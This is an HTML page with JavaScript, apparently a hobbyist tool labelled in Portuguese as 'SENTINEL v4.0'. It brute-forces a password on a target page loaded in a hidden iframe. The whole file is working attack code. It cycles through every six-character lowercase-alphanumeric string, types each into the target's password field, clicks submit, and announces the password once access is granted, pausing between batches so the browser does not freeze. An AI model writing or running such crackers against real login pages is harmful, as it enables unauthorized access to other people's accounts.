<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SENTINEL OS v4.0 - ANTI-FREEZE</title>
    <style>
        body { background: #050505; color: #00ff41; font-family: 'Courier New', monospace; padding: 20px; transition: background 0.5s; }
        .panel { width: 100%; max-width: 500px; border: 1px solid #00ff41; padding: 20px; background: #000; margin: auto; }
        #console { height: 200px; overflow-y: auto; background: #000; border: 1px solid #113311; padding: 10px; font-size: 11px; margin-bottom: 10px; }
        .found-screen { background: #fff !important; color: #000 !important; }
        button { background: #00ff41; color: #000; border: none; padding: 15px; width: 100%; font-weight: bold; }
        .status-box { font-size: 10px; margin-bottom: 10px; color: #888; }
    </style>
</head>
<body>

    <div class="panel" id="mainPanel">
        <h2>SENTINEL v4.0</h2>
        <div class="status-box">MODO: ESTABILIDADE MÁXIMA (ANTI-TRAVAMENTO)</div>
        <div id="console">> SISTEMA PRONTO...</div>
        <button id="btn" onclick="iniciarAtaqueEstavel()">INICIAR QUEBRA</button>
    </div>

    <iframe id="targetFrame" src="alvo.html" style="display:none;"></iframe>

    <script>
        const charset = "abcdefghijklmnopqrstuvwxyz0123456789";
        let encontrado = false;

        async function log(m) {
            const c = document.getElementById('console');
            c.innerHTML += `<div>> ${m}</div>`;
            c.scrollTop = c.scrollHeight;
        }

        async function iniciarAtaqueEstavel() {
            if (encontrado) return;
            const btn = document.getElementById('btn');
            const frame = document.getElementById('targetFrame');
            const targetDoc = frame.contentDocument || frame.contentWindow.document;
            
            btn.disabled = true;
            btn.innerText = "QUEBRANDO...";
            await log("Iniciando motor estabilizado...");

            // Função para testar uma única combinação
            const testar = (combo) => {
                const input = targetDoc.getElementById('pass');
                const botao = targetDoc.querySelector('button');
                const statusAlvo = targetDoc.getElementById('status');

                input.value = combo;
                botao.click();

                if (statusAlvo.innerHTML.includes("CONCEDIDO")) {
                    encontrado = true;
                    document.body.classList.add('found-screen');
                    alert("!!! SENHA ENCONTRADA: " + combo + " !!!");
                    log("SUCESSO: " + combo);
                    return true;
                }
                return false;
            };

            // Gerador que permite pausas (evita o travamento do Chrome)
            let c1=0, c2=0, c3=0, c4=0, c5=0, c6=0; 
            
            const rodarBloco = () => {
                if (encontrado) return;

                // Testamos um bloco de 500 combinações por vez
                for (let i = 0; i < 500; i++) {
                    let senha = charset[c1] + charset[c2] + charset[c3] + charset[c4] + charset[c5] + charset[c6];
                    
                    if (testar(senha)) return;

                    // Lógica de incremento dos 6 dígitos
                    c6++;
                    if (c6 >= charset.length) { c6 = 0; c5++; }
                    if (c5 >= charset.length) { c5 = 0; c4++; }
                    if (c4 >= charset.length) { c4 = 0; c3++; }
                    if (c3 >= charset.length) { c3 = 0; c2++; }
                    if (c2 >= charset.length) { c2 = 0; c1++; }
                    if (c1 >= charset.length) { log("Fim das possibilidades."); return; }
                }

                // O SEGREDO: Aqui damos 1 milissegundo para o Chrome respirar
                log("Testando: " + charset[c1] + charset[c2] + charset[c3] + "...");
                setTimeout(rodarBloco, 1); 
            };

            rodarBloco();
        }
    </script>
</body>
</html>
